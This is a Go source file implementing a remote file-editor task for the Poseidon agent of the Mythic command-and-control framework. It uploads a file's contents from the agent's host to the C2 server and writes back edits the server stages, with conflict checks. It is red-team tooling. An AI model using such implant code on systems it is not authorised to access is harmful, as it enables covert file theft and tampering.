//go:build (linux || darwin) && (edit || debug)

package edit

import (
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

const maxEditableFileSize = 2000000

type fileEditorRequest struct {
	Action         string `json:"action"`
	RequestID      string `json:"request_id"`
	FileID         string `json:"file_id"`
	ExpectedSHA1   string `json:"expected_sha1"`
	ForceOverwrite bool   `json:"force_overwrite"`
}

type fileEditorResponse struct {
	RequestID    string `json:"request_id,omitempty"`
	FileID       string `json:"file_id,omitempty"`
	Code         string `json:"code,omitempty"`
	Message      string `json:"message,omitempty"`
	ExpectedSHA1 string `json:"expected_sha1,omitempty"`
	CurrentSHA1  string `json:"current_sha1,omitempty"`
}

func init() {
	taskRegistrar.Register("edit", Run)
}

func sendEditorMessage(task *structs.Task, messageType InteractiveTask.MessageType, message fileEditorResponse) {
	data, _ := json.Marshal(message)
	task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
		TaskUUID:    task.TaskID,
		Data:        base64.StdEncoding.EncodeToString(data),
		MessageType: messageType,
	}
}

func sendEditorError(task *structs.Task, requestID string, code string, message string) {
	sendEditorMessage(task, InteractiveTask.FileEditorError, fileEditorResponse{
		RequestID: requestID,
		Code:      code,
		Message:   message,
	})
}

func sendTaskStatus(task *structs.Task, status string) {
	response := task.NewResponse()
	response.Status = status
	task.Job.SendResponses <- response
}

func sha1Hex(data []byte) string {
	digest := sha1.Sum(data)
	return hex.EncodeToString(digest[:])
}

func readEditableFile(path string) ([]byte, os.FileInfo, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, nil, err
	}
	if !info.Mode().IsRegular() {
		return nil, nil, fmt.Errorf("%s is not a regular file", path)
	}
	if info.Size() > maxEditableFileSize {
		return nil, nil, fmt.Errorf("file is larger than the 2 MB editor limit")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, nil, err
	}
	if !utf8.Valid(data) {
		return nil, nil, fmt.Errorf("file is not valid UTF-8 text")
	}
	return data, info, nil
}

func sendSnapshot(task *structs.Task, path string, requestID string) error {
	sendTaskStatus(task, "sending file editor snapshot")
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()
	resultChannel := make(chan structs.FileTransferResult, 1)
	transfer := structs.SendFileToMythicStruct{
		Task:          task,
		FileName:      file.Name(),
		FullPath:      path,
		File:          file,
		ResultChannel: resultChannel,
	}
	task.Job.SendFileToMythic <- transfer
	result := <-resultChannel
	if result.Error != "" {
		return fmt.Errorf("failed to send editor snapshot: %s", result.Error)
	}
	if result.FileID == "" {
		return fmt.Errorf("Mythic did not return a file ID for the editor snapshot")
	}
	sendEditorMessage(task, InteractiveTask.FileEditorResponse, fileEditorResponse{
		RequestID: requestID,
		FileID:    result.FileID,
	})
	return nil
}

func fetchStagedFile(task *structs.Task, path string, fileID string) ([]byte, error) {
	chunks := make(chan []byte)
	resultChannel := make(chan structs.FileTransferResult, 1)
	transfer := structs.GetFileFromMythicStruct{
		Task:                 task,
		FileID:               fileID,
		FullPath:             path,
		ReceivedChunkChannel: chunks,
		ResultChannel:        resultChannel,
	}
	task.Job.GetFileFromMythic <- transfer
	data := make([]byte, 0)
	tooLarge := false
	for {
		chunk := <-chunks
		if len(chunk) == 0 {
			break
		}
		if len(data)+len(chunk) > maxEditableFileSize {
			tooLarge = true
			continue
		}
		if !tooLarge {
			data = append(data, chunk...)
		}
	}
	result := <-resultChannel
	if result.Error != "" {
		return nil, fmt.Errorf("failed to fetch staged file: %s", result.Error)
	}
	if tooLarge {
		return nil, fmt.Errorf("staged file is larger than the 2 MB editor limit")
	}
	if !utf8.Valid(data) {
		return nil, fmt.Errorf("staged file is not valid UTF-8 text")
	}
	return data, nil
}

func replaceFileAtomically(path string, data []byte, mode os.FileMode) error {
	temporary, err := os.CreateTemp(filepath.Dir(path), "*")
	if err != nil {
		return err
	}
	temporaryPath := temporary.Name()
	defer os.Remove(temporaryPath)
	if err = temporary.Chmod(mode.Perm()); err == nil {
		_, err = temporary.Write(data)
	}
	if err == nil {
		err = temporary.Sync()
	}
	if closeError := temporary.Close(); err == nil {
		err = closeError
	}
	if err != nil {
		return err
	}
	return os.Rename(temporaryPath, path)
}

func sendConflict(task *structs.Task, request fileEditorRequest, currentSHA1 string, message string) {
	sendEditorMessage(task, InteractiveTask.FileEditorError, fileEditorResponse{
		RequestID:    request.RequestID,
		FileID:       request.FileID,
		Code:         "conflict",
		Message:      message,
		ExpectedSHA1: request.ExpectedSHA1,
		CurrentSHA1:  currentSHA1,
	})
}

func handleSave(task *structs.Task, path string, request fileEditorRequest) {
	finalStatus := "file editor open"
	defer func() { sendTaskStatus(task, finalStatus) }()
	sendTaskStatus(task, "checking file edit for conflicts")
	if request.FileID == "" || request.ExpectedSHA1 == "" {
		finalStatus = "file editor open - save failed"
		sendEditorError(task, request.RequestID, "invalid_request", "save requires file_id and expected_sha1")
		return
	}
	currentData, info, err := readEditableFile(path)
	if err != nil {
		finalStatus = "file editor open - save failed"
		sendEditorError(task, request.RequestID, "read_failed", err.Error())
		return
	}
	currentSHA1 := sha1Hex(currentData)
	if !request.ForceOverwrite && !strings.EqualFold(request.ExpectedSHA1, currentSHA1) {
		finalStatus = "file editor open - conflict"
		sendConflict(task, request, currentSHA1, "The file changed on disk after the editor snapshot was loaded.")
		return
	}
	sendTaskStatus(task, "receiving staged file edit")
	stagedData, err := fetchStagedFile(task, path, request.FileID)
	if err != nil {
		finalStatus = "file editor open - save failed"
		sendEditorError(task, request.RequestID, "staged_file_failed", err.Error())
		return
	}
	if err = replaceFileAtomically(path, stagedData, info.Mode()); err != nil {
		finalStatus = "file editor open - save failed"
		sendEditorError(task, request.RequestID, "write_failed", err.Error())
		return
	}
	sendEditorMessage(task, InteractiveTask.FileEditorResponse, fileEditorResponse{
		RequestID:   request.RequestID,
		FileID:      request.FileID,
		CurrentSHA1: currentSHA1,
	})
}

func handleRequest(task *structs.Task, path string, input structs.InteractiveTaskMessage) bool {
	if input.MessageType != InteractiveTask.FileEditorRequest {
		sendEditorError(task, "", "invalid_message_type", "edit only accepts file editor requests")
		return false
	}
	decoded, err := base64.StdEncoding.DecodeString(input.Data)
	if err != nil {
		sendEditorError(task, "", "invalid_request", "failed to decode editor request")
		return false
	}
	request := fileEditorRequest{}
	if err = json.Unmarshal(decoded, &request); err != nil {
		sendEditorError(task, "", "invalid_request", "failed to parse editor request")
		return false
	}
	switch request.Action {
	case "refresh":
		sendTaskStatus(task, "refreshing file editor")
		err = sendSnapshot(task, path, request.RequestID)
		if err != nil {
			sendEditorError(task, request.RequestID, "snapshot_failed", err.Error())
			sendTaskStatus(task, "file editor open - refresh failed")
		} else {
			sendTaskStatus(task, "file editor open")
		}
	case "save":
		handleSave(task, path, request)
	case "close":
		response := task.NewResponse()
		response.Completed = true
		response.Status = "completed"
		response.UserOutput = "File editor closed"
		task.Job.SendResponses <- response
		return true
	default:
		sendEditorError(task, request.RequestID, "invalid_action", "unknown file editor action")
	}
	return false
}

func Run(task structs.Task) {
	path := strings.TrimSpace(task.Params)
	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}
	absolutePath, err := filepath.Abs(path)
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if absolutePath, err = filepath.EvalSymlinks(absolutePath); err != nil {
		sendEditorError(&task, "", "open_failed", err.Error())
		msg := task.NewResponse()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	sendTaskStatus(&task, "opening file editor")
	err = sendSnapshot(&task, absolutePath, "")
	if err != nil {
		sendEditorError(&task, "", "open_failed", err.Error())
		msg := task.NewResponse()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	sendTaskStatus(&task, "file editor open")
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case input := <-task.Job.InteractiveTaskInputChannel:
			if handleRequest(&task, absolutePath, input) {
				return
			}
		case <-ticker.C:
			if task.ShouldStop() {
				return
			}
		}
	}
}
